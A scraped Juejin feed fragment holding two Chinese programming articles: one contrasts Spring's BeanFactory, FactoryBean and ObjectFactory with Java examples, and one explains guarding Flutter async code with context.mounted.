100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>今天，代码又报错了。或者也许是昨天，我不清楚。
不管怎样，Spring 容器抛出了一个 <code>BeanCreationException</code>。为了解决它，我被迫潜入框架的深处，去注视那些平时被 <code>@Autowired</code> 掩盖的齿轮。</p>
<p>在 Spring 的世界里，存在着一种必然的复杂性。这种复杂性并非设计者的恶趣味，而是为了在一个静态的语言中构建动态世界所付出的代价。</p>
<p>在这个庞大的机器中，有三个名字极其相似的概念经常被混淆：<code>BeanFactory</code>、<code>FactoryBean</code> 和 <code>ObjectFactory</code>。这并不是命名的贫瘠，而是它们在本质上确实存在着微妙的纠缠。</p>
<p>今天，我们剥离掉那些花哨的比喻和无用的糖衣，用一种冷静的、近乎解剖学的视角，去审视这三个概念的本质。</p>
<hr/>
<h2 data-id="heading-0">一、BeanFactory：存在的容器</h2>
<p><strong>让我们首先纠正一个观念：BeanFactory 名为工厂，但其本质是容器（Container）。</strong></p>
<p>当我们谈论 Spring 容器时，我们实际上是在谈论 <code>BeanFactory</code>。它是 Spring IoC 容器的根接口，是整个世界的物理法则。</p>
<h3 data-id="heading-1">1.1 唯一的职责</h3>
<p>它的定义极其克制。它不关心业务逻辑，只关心一件事：<strong>管理对象的生命周期</strong>。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">BeanFactory</span> {
    Object <span class="hljs-title function_">getBean</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> BeansException;
    &lt;T&gt; T <span class="hljs-title function_">getBean</span><span class="hljs-params">(String name, Class&lt;T&gt; requiredType)</span>;
    <span class="hljs-type">boolean</span> <span class="hljs-title function_">containsBean</span><span class="hljs-params">(String name)</span>;
    <span class="hljs-comment">// ...</span>
}
</code></pre>
<p>当你启动一个 Spring Boot 应用时，<code>ApplicationContext</code> 就像一个充满活力的城市，而 <code>BeanFactory</code> 则是支撑这座城市的地下管网。所有的 BeanDefinition（关于 Bean 应该如何创建的蓝图）都注册在这里。</p>
<h3 data-id="heading-2">1.2 残酷的现实</h3>
<p>在大多数情况下，你不需要直接与 <code>BeanFactory</code> 对话。因为 <code>ApplicationContext</code> 已经为你封装好了一切。
但当你试图理解为什么你的 Bean 没有被正确初始化，或者为什么你的循环依赖失效时，你就必须意识到：<strong>你所有的 Bean，都只是 <code>BeanFactory</code> 中的 entries（条目）。</strong></p>
<p>它是一个巨大的 <code>Map&lt;String, BeanDefinition&gt;</code> 和 <code>Map&lt;String, Object&gt;</code> 的管理者。它冷酷无情，只按照定义的规则（Scope, Lazy, Dependence）来实例化对象。</p>
<hr/>
<h2 data-id="heading-3">二、FactoryBean：必要的欺骗</h2>
<p>如果说 <code>BeanFactory</code> 是宏观规则的制定者，那么 <code>FactoryBean</code> 就是微观规则的<strong>潜行者</strong>。</p>
<h3 data-id="heading-4">2.1 静态语言的困境</h3>
<p>想象这样一个场景：<strong>你需要注入一个接口的实现，但这个实现类并不存在于代码中，它是通过动态代理在运行时生成的。</strong>
这在 RPC 框架（如 Dubbo、Feign）和 ORM 框架（如 MyBatis）中极其常见。</p>
<p>你无法通过简单的 <code>&lt;bean class="..."&gt;</code> 或 <code>@Component</code> 来描述一个“不存在的类”。
这时候，你需要一个中间人。这个中间人表面上是一个普通的 Bean，但实际上，它是一个工厂。</p>
<h3 data-id="heading-5">2.2 伪装的艺术：以 MyBatis 为例</h3>
<p>为什么你只需要写一个 <code>UserMapper</code> 接口，就能直接 <code>@Autowired</code> 使用？
因为 Spring 容器里注册的那个 "userMapper" Bean，根本不是你的接口实现，而是一个 <code>MapperFactoryBean</code>。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 简化的逻辑示意</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MapperFactoryBean</span>&lt;T&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">FactoryBean</span>&lt;T&gt; {
    
    <span class="hljs-keyword">private</span> Class&lt;T&gt; mapperInterface;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> T <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// 往里跟进，最终这里发生了魔法：通过 JDK 动态代理生成接口的实</span>
        <span class="hljs-keyword">return</span> (T) Proxy.newProxyInstance(
            mapperInterface.getClassLoader(), 
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] { mapperInterface }, 
            <span class="hljs-keyword">new</span> <span class="hljs-title class_">MapperProxy</span>&lt;&gt;()
        );
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Class&lt;?&gt; getObjectType() {
        <span class="hljs-keyword">return</span> mapperInterface;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isSingleton</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
}
</code></pre>
<h3 data-id="heading-6">2.3 这里的真相</h3>
<p>当容器调用 <code>getBean("userMapper")</code> 时，它发现这是一个 <code>FactoryBean</code>。于是，它不会返回 <code>FactoryBean</code> 实例本身，而是默默地调用 <code>getObject()</code>，并返回那个代理对象。</p>
<p>这就是欺骗。<strong>你以为你拿到了一个 Bean，其实你拿到的是 Bean 生产的产品。</strong></p>
<p>如果你渴望看到真相，看到那个操纵傀儡的幕后黑手，你需要在 Bean 名称前加上 <code>&amp;</code>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 获取的是 MapperProxy 代理对象</span>
<span class="hljs-type">Object</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> context.getBean(<span class="hljs-string">"userMapper"</span>); 

<span class="hljs-comment">// 获取的是 FactoryBean 工厂本身</span>
<span class="hljs-type">Object</span> <span class="hljs-variable">factory</span> <span class="hljs-operator">=</span> context.getBean(<span class="hljs-string">"&amp;userMapper"</span>);
</code></pre>
<hr/>
<h2 data-id="heading-7">三、ObjectFactory：时间的延迟</h2>
<p><code>BeanFactory</code> 负责掌控空间（容器），<code>FactoryBean</code> 负责掌控构造（逻辑），而 <code>ObjectFactory</code> 则是为了掌控<strong>时间</strong>。</p>
<h3 data-id="heading-8">3.1 循环的死结</h3>
<p>在 Spring 的世界里，有一个经典的荒谬：A 需要 B，B 需要 A。
如果是构造器注入，只需坦然承认失败。但如果是 Setter 注入，Spring 试图挽救这种死结。</p>
<p>在 A 创建的过程中，需要注入 B。B 创建时，又需要注入 A。
此时 A 还在创建中，尚不是一个完整的 Bean。怎么办？
Spring 引入了三级缓存的概念。而第三级缓存，存放的就是一个 <code>ObjectFactory</code>。</p>
<h3 data-id="heading-9">3.2 回调的本质</h3>
<p><code>ObjectFactory</code> 在源码中简单得令人发指：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@FunctionalInterface</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ObjectFactory</span>&lt;T&gt; {
    T <span class="hljs-title function_">getObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> BeansException;
}
</code></pre>
<p>它只是一个<strong>函数式接口</strong>，一个回调。
它存在的意义在于：<strong>我现在不想要这个对象，但我想要一个“在未来某个时刻能获取这个对象”的能力。</strong></p>
<p>在循环依赖中，Spring 提前暴露了一个 <code>ObjectFactory</code>：</p>
<pre><code class="hljs language-java" lang="java">addSingletonFactory(beanName, () -&gt; getEarlyBeanReference(beanName, mbd, bean));
</code></pre>
<p>当 B 需要 A 时，它通过这个 <code>ObjectFactory</code> 拿到了 A 的早期引用（Early Reference）。尽管 A 还没完全初始化好，但 B 已经可以持有它的引用了。死结解开了。</p>
<h3 data-id="heading-10">3.3 作用域的错位</h3>
<p>另一个场景是：一个单例（Singleton）的 Service 需要使用一个 原型（Prototype）的 Bean。
如果你直接 <code>@Autowired</code>，原型的 Bean 只有在 Service 创建时被注入一次，之后也就是永远同一个对象了。这违背了原型的初衷。</p>
<p>如何解决？使用 <code>ObjectFactory</code> 延迟获取。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReportService</span> {
    
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ObjectFactory&lt;ReportBuilder&gt; builderFactory;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">generate</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 每次调用 getObject()，容器都会创建一个全新的 ReportBuilder</span>
        <span class="hljs-type">ReportBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> builderFactory.getObject();
        builder.build();
    }
}
</code></pre>
<p>在这里，<strong><code>ObjectFactory</code> 就像是一个通往容器的句柄，让你随时可以伸手进去拿一个新的对象，而不是守着陈旧的缓存。</strong></p>
<hr/>
<h2 data-id="heading-11">四、审判与裁决</h2>
<p>让我们在最后，用最客观的表格来审判这三者的区别。这不是为了背诵，而是为了理清混乱。</p>









































<table><thead><tr><th align="left">维度</th><th align="left">BeanFactory</th><th align="left">FactoryBean</th><th align="left">ObjectFactory</th></tr></thead><tbody><tr><td align="left"><strong>存在形式</strong></td><td align="left"><strong>容器</strong> (Container)</td><td align="left"><strong>Bean</strong> (Component)</td><td align="left"><strong>接口</strong> (Interface/Callback)</td></tr><tr><td align="left"><strong>底层逻辑</strong></td><td align="left"><code>ApplicationContext</code> 的父级接口 / <strong>宏观工厂</strong></td><td align="left">实现了 <code>FactoryBean</code> 接口的类 / <strong>微观工厂</strong></td><td align="left">函数式接口 / <strong>延迟回调</strong></td></tr><tr><td align="left"><strong>核心职责</strong></td><td align="left">管理所有 Bean 的生命周期</td><td align="left">此 Bean 负责<strong>生产</strong>另一个复杂的 Bean</td><td align="left">封装对象的创建过程，提供<strong>延迟</strong>获取能力</td></tr><tr><td align="left"><strong>获取方式</strong></td><td align="left"><code>ApplicationContext</code> 是它的超集</td><td align="left"><code>getBean("name")</code> 拿产品<br/><code>getBean("&amp;name")</code> 拿工厂</td><td align="left">注入 <code>ObjectFactory&lt;T&gt;</code> 后调用 <code>getObject()</code></td></tr><tr><td align="left"><strong>真实场景</strong></td><td align="left">Spring 框架的基石</td><td align="left">Mybatis <code>MapperFactoryBean</code>, <code>ProxyFactoryBean</code></td><td align="left">解决循环依赖(三级缓存), Scope(原型模式)适配</td></tr></tbody></table>
<h2 data-id="heading-12">五、结语</h2>
<p>在代码的荒原上，我们通过构建抽象来对抗混乱。</p>
<ul>
<li><strong>BeanFactory</strong> 是我们脚下的大地。<strong>它被称为工厂，但它实际是孕育万物的土壤（容器）。</strong></li>
<li><strong>FactoryBean</strong> 是我们手中的精密机床。<strong>它是一个特殊的 Bean，存在的目的却是为了制造另一个 Bean。</strong></li>
<li><strong>ObjectFactory</strong> 是我们预留的时间胶囊。<strong>它只是一个单纯的接口，为了应对循环与未来的不确定性。</strong></li>
</ul>
<p>理解它们，并不是为了通过面试，而是为了在下一次抛出异常时，你能冷静地凝视堆栈信息，知道机器的哪个齿轮发生了错位。</p>
<p>既然我们选择了与机器共舞，就必须理解机器的逻辑。这或许就是作为开发者的西西弗斯式命运——<strong>我们需要一次又一次地将巨石推向山顶，以此证明我们对这个庞大系统的掌控</strong>。</p>
<blockquote>
<p><strong>本文通过 AI 润色（加缪风格），试图以一种冷静、客观甚至存在主义的视角，去解构这些在日常 Coding 中被我们习以为常的概念。希望这种独特的叙事风格，能让你对这些枯燥的技术概念有更深刻的“存在感”。</strong></p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深度解析：如何彻底终结 Flutter 异步操作中的 BuildContext 崩溃？]]></title>    <link>https://juejin.cn/post/7594321135591374857</link>    <guid>https://juejin.cn/post/7594321135591374857</guid>    <pubDate>2026-01-13T01:34:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594321135591374857" data-draft-id="7592432859863466018" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深度解析：如何彻底终结 Flutter 异步操作中的 BuildContext 崩溃？"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-13T01:34:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="JarvanMo"/> <meta itemprop="url" content="https://juejin.cn/user/2348212565845704"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深度解析：如何彻底终结 Flutter 异步操作中的 BuildContext 崩溃？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2348212565845704/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    JarvanMo
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-13T01:34:25.000Z" title="Tue Jan 13 2026 01:34:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这种情况我们都见过： 你在本地跑着 App，点下“提交”按钮，API 请求顺利完成，页面成功跳转。一切看起来都完美无缺。于是你信心满满地合并了 PR，发布上线。结果，后台日志突然就开始对着你<strong>疯狂咆哮</strong>：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d6199191be24a179e60c010251fca9f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmFydmFuTW8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768872865&amp;x-signature=X6AXSEDACCJX%2Bs%2BAkMz4Y%2Fr%2BhlY%3D" alt="image.png" loading="lazy"/></p>
<blockquote>
<p>Looking up a deactivated widget’s ancestor is unsafe.</p>
<p>At this point the state of the widget’s element tree is no longer stable.</p>
</blockquote>
<blockquote>
<p>“查找已停用 Widget 的祖先节点是不安全的。”</p>
<p>“此时，该 Widget 对应的 Element 树状态已不再稳定。”</p>
</blockquote>
<p>你尝试在本地复现这个 Bug，但怎么试都没问题。 这就是所谓的<strong>异步间隙（Async Gap）</strong> 。如果你没有针对它做防御性编程，那么此时此刻，那些网速较慢的用户正在经历频繁的闪退。</p>
<h4 data-id="heading-0">“我电脑上运行好好的” —— 这个陷阱</h4>
<p>作为工程师，我们习惯在飞速的 Wi-Fi 和模拟器上做测试。点一下按钮，API 只要 100 毫秒就返回了。在结果回来之前，我们根本<strong>没时间</strong>切换页面。</p>
<p>但在现实世界里，你的用户可能用的是 3G 甚至更慢的网络。</p>
<ol>
<li>他们点下“登录”。</li>
<li>请求卡住了 3 秒。</li>
<li>用户等烦了（或者意识到邮箱填错了），于是按了**“返回”**键。</li>
<li>此时，Widget 被销毁（Disposed），页面彻底消失了。</li>
<li><strong>紧接着</strong>，API 终于返回成功了。</li>
</ol>
<p>你的代码在 <code>await</code> 之后恢复执行，它顺手抓起 <code>context</code> 准备跳转到首页……然而，这个 <code>context</code> 指向的 Widget 此时已经在**垃圾回收器（GC）**里排队了。</p>
<h4 data-id="heading-1">解决方案：一行微小的代码，省去巨大的头疼</h4>
<p>在 Flutter 3.7 之前，处理这个问题很烦人。你必须在 <code>State</code> 类里检查 <code>mounted</code> 属性，代码写起来很不优雅。现在，我们有了一个简单且统一的方案：</p>
<p><strong><code>context.mounted</code></strong></p>
<p>这个属性允许你检查 <code>context</code> 是否依然有效，以及它是否还在 Widget 树中。 每当你完成一个<strong>异步调用</strong>，并准备执行以下操作时：</p>
<ul>
<li>页面跳转 (Navigation)</li>
<li>弹出对话框 (Dialogs)</li>
<li>显示底栏通知 (Snackbars)</li>
<li>查找主题 (Theme lookups)</li>
<li><strong>任何需要用到 <code>context</code> 的操作</strong></li>
</ul>
<p>……你都必须加上一层防护。</p>
<p><strong>不安全的写法：</strong></p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">void</span> onButtonTapped(BuildContext context) <span class="hljs-keyword">async</span> {  
    <span class="hljs-keyword">await</span> myLongRunningTask();  
  
<span class="hljs-comment">// 如果用户已经离开页面，这一行就会导致 App 崩溃。</span>
    Navigator.pop(context);  
}

</code></pre>
<p><strong>安全的写法：</strong></p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">void</span> onButtonTapped(BuildContext context) <span class="hljs-keyword">async</span> {
  <span class="hljs-comment">// 1. 开始异步任务（例如 API 请求或耗时计算）</span>
  <span class="hljs-keyword">await</span> myLongRunningTask();
  
  <span class="hljs-comment">// 2. 防御性检查（核心守卫语句）</span>
  <span class="hljs-comment">// 如果此时 Widget 已经从树中卸载，则立即停止执行后续代码。</span>
  <span class="hljs-keyword">if</span> (!context.mounted) <span class="hljs-keyword">return</span>;

  <span class="hljs-comment">// 3. 只有在 context 依然有效（Mounted）的情况下，</span>
  <span class="hljs-comment">// 此时使用 context 进行导航或 UI 操作才是安全的。</span>
  Navigator.pop(context);
}
</code></pre>
<h4 data-id="heading-2">为什么资深工程师必须在意这一点？</h4>
<p>这不仅仅是为了避免开发阶段出现红屏报错，更是**防御性编程（Defensive Programming）**的核心体现。</p>
<p>我们无法掌控网络状况，也无法左右用户的行为。 我们唯一能控制的，是当这两者“掉链子”时，我们的代码将如何应对。 养成随手加上 <code>if (!context.mounted) return;</code> 的习惯虽然只是个微小的细节，但它正是<strong>脆弱的 Demo 演示</strong>与<strong>健壮的生产级工程</strong>之间的分水岭。</p>
<h4 data-id="heading-3">最后一个问题</h4>
<p>你最近检查过 Firebase Crashlytics 日志里的这个特定报错吗？或者，你还有哪些曾让你抓狂的“隐形”Bug？</p>
